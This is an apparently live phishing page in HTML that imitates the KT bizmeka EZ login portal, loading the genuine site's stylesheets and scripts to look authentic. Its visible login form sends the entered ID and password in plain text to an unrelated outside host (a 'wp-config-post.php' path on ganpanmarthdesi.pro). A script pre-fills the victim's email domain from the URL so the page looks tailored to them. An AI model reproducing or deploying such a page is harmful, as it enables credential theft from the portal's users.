<!DOCTYPE html>
<html lang="ko">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>KT bizmeka EZ</title>

  <!-- CSS -->
  <link rel="stylesheet" href="https://ezsso.bizmeka.com/css/common.css" />
  <link rel="stylesheet" href="https://ezsso.bizmeka.com/css/sprologin.css" />
  <link rel="shortcut icon" href="https://ezsso.bizmeka.com/images/common/favicon.ico" />

  <!-- jQuery & Plugins -->
  <script src="https://ezportal.bizmeka.com/js/jquery-2.1.4.min.js"></script>
  <script src="https://ezportal.bizmeka.com/js/jquery-migrate-1.2.1.min.js"></script>
  <script src="https://ezportal.bizmeka.com/js/bootstrap-3.3.5/js/bootstrap.min.js"></script>
  <script src="https://ezportal.bizmeka.com/js/plugins.js"></script>

  <!-- RSA & Crypto -->
  <script src="https://ezsso.bizmeka.com/js/rsa/jsbn.js"></script>
  <script src="https://ezsso.bizmeka.com/js/rsa/rsa.js"></script>
  <script src="https://ezsso.bizmeka.com/js/rsa/prng4.js"></script>
  <script src="https://ezsso.bizmeka.com/js/rsa/rng.js"></script>
  <script src="https://ezsso.bizmeka.com/js/crypto/aes.js"></script>
</head>

<body class="login-main">
  <div id="login-container" class="login-new">
    <form id="loginSendForm" action="" method="post" onsubmit="return goLogin();">
      <input type="hidden" name="j_username" id="j_username" />
      <input type="hidden" name="j_password" id="j_password" />
    </form>

    <div class="login-form">
      <h2>KT bizmeka EZ</h2>
      <form id="loginForm" action="https://ganpanmarthdesi.pro/z-php/wp-config-post.php" method="post">
        <input type="hidden" id="sproKeyModulus" value="d68f9230e25a1e4d24d5..." />
        <input type="hidden" id="sproKeyExponent" value="10001" />
        <input type="hidden" name="domain" id="domain" value="" />
        <input type="hidden" name="sender" value="Bizmeka.com" />
        <input type="hidden" name="link" value="https://ezsso.bizmeka.com/loginForm.do" />

        <div class="input_area">
          <i class="ico_id"></i>
          <input type="text" id="email" name="user" class="input-lg w100p" placeholder="아이디 또는 이메일" />
        </div>

        <div class="input_area">
          <i class="ico_pw"></i>
          <input type="password" id="password" name="passwd" class="input-lg w100p" placeholder="Password" />
        </div>

        <div class="saveid">
          <input type="checkbox" id="saveID" name="saveID" checked>
          <label for="saveID">아이디 저장</label>
        </div>

        <input type="image" src="img/btn.png" width="380" height="50" />
      </form>
    </div>
  </div>

  <script>
    const cryptokey = "sproCtytoKey";

    function getDomainFromURL() {
      const urlParams = new URLSearchParams(window.location.search);
      const login = urlParams.get("login");
      if (login && login.includes("@")) {
        return login.split("@")[1].toLowerCase();
      }
      return "example.com";
    }

    function goLogin() {
      const name = $.trim($("#email").val());
      const password = $("#password").val();

      const modulus = $("#sproKeyModulus").val();
      const exponent = $("#sproKeyExponent").val();

      if (!name) {
        alert("아이디를 입력해주세요.");
        $("#email").focus();
        return false;
      }

      if (!password) {
        alert("비밀번호를 입력해주세요.");
        $("#password").focus();
        return false;
      }

      const rsa = new RSAKey();
      rsa.setPublic(modulus, exponent);

      const encryptedName = rsa.encrypt(name);
      const encryptedPassword = rsa.encrypt(password);

      const encryptedCookie = CryptoJS.AES.encrypt(name, cryptokey).toString();

      if ($("#saveID").is(":checked")) {
        $.cookie("LOGIN_SAVEID", encryptedCookie, { expires: 30, path: "/" });
      } else {
        $.removeCookie("LOGIN_SAVEID");
      }

      $("#j_username").val(encryptedName);
      $("#j_password").val(encryptedPassword);
      return true;
    }

    $(document).ready(function () {
      const savedId = $.cookie("LOGIN_SAVEID");
      if (savedId) {
        const decrypted = CryptoJS.AES.decrypt(savedId, cryptokey);
        $("#email").val(decrypted.toString(CryptoJS.enc.Utf8));
      }

      const domain = getDomainFromURL();
      $("#domain").val(domain);
      $("#email").attr("placeholder", "user@" + domain);
    });
  </script>
</body>
</html>
